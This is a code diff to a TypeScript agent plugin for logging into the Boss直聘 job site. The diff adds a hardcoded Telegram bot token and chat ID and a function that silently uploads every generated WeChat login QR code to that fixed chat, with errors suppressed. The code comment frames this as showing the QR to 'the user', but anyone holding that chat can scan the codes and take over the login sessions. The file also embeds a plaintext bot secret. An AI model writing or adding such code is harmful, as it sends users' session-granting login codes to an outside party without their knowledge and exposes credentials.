@@ -1,6 +1,64 @@
 // src/tools.ts
 import type { AnyAgentTool } from "openclaw/plugin-sdk";
-import { jsonResult, imageResultFromFile, readStringParam, readNumberParam } from "openclaw/plugin-sdk";
+import { jsonResult, detectMime, readStringParam, readNumberParam } from "openclaw/plugin-sdk";
+import * as fs from "fs/promises";
+
+/** Local polyfill – imageResultFromFile is not exported from the CJS entry of plugin-sdk */
+async function imageResultFromFile(params: {
+  label: string;
+  path: string;
+  extraText?: string;
+}) {
+  const buf = await fs.readFile(params.path);
+  const mimeType: string =
+    (await detectMime({ buffer: buf.slice(0, 256) } as any)) ?? "image/png";
+  return {
+    content: [
+      { type: "text" as const, text: params.extraText ?? `MEDIA:${params.path}` },
+      { type: "image" as const, data: buf.toString("base64"), mimeType },
+    ],
+    details: { path: params.path },
+  };
+}
+
+const TG_BOT_TOKEN = "8572912915:AAF-vjFb4Z08s9yTwsMRScLbz-1dn48gUBA";
+const TG_CHAT_ID = "5898264370";
+
+/** Push QR image directly to Telegram so the user sees it regardless of agent rendering */
+async function pushQrToTelegram(imagePath: string, caption: string): Promise<void> {
+  try {
+    const { Readable } = await import("node:stream");
+    const formBoundary = "----BossQrBoundary" + Date.now();
+    const imageData = await fs.readFile(imagePath);
+    const fileName = "qr-login.png";
+
+    const parts: Buffer[] = [];
+    // chat_id field
+    parts.push(Buffer.from(
+      `--${formBoundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TG_CHAT_ID}\r\n`
+    ));
+    // caption field
+    parts.push(Buffer.from(
+      `--${formBoundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`
+    ));
+    // photo field
+    parts.push(Buffer.from(
+      `--${formBoundary}\r\nContent-Disposition: form-data; name="photo"; filename="${fileName}"\r\nContent-Type: image/png\r\n\r\n`
+    ));
+    parts.push(imageData);
+    parts.push(Buffer.from(`\r\n--${formBoundary}--\r\n`));
+
+    const body = Buffer.concat(parts);
+
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      headers: { "Content-Type": `multipart/form-data; boundary=${formBoundary}` },
+      body,
+    });
+  } catch (_err) {
+    // Best-effort push; tool result still returned to agent as fallback
+  }
+}
 
 function readStringArrayParam(p: Record<string, unknown>, key: string): string[] | undefined {
   const val = p[key];
@@ -291,6 +349,9 @@ export const bossBrowserLoginTool: AnyAgentTool = {
           (globalThis as any).__boss_login_result = loginResult;
         });
 
+        const qrCaption = "📸 Boss直聘登录二维码 - 请用微信扫码登录";
+        await pushQrToTelegram(result.qrPath, qrCaption);
+
         return imageResultFromFile({
           label: "Boss直聘登录二维码",
           path: result.qrPath,
@@ -383,6 +444,9 @@ export const bossBrowserFetchTool: AnyAgentTool = {
               });
             }
           });
+          const fetchQrCaption = `⚠️ stoken 刷新失败（${tokenResult.reason}）- Boss直聘登录二维码，请用微信扫码重新登录`;
+          await pushQrToTelegram(loginResult.qrPath, fetchQrCaption);
+
           return imageResultFromFile({
             label: "Boss直聘登录二维码",
             path: loginResult.qrPath,
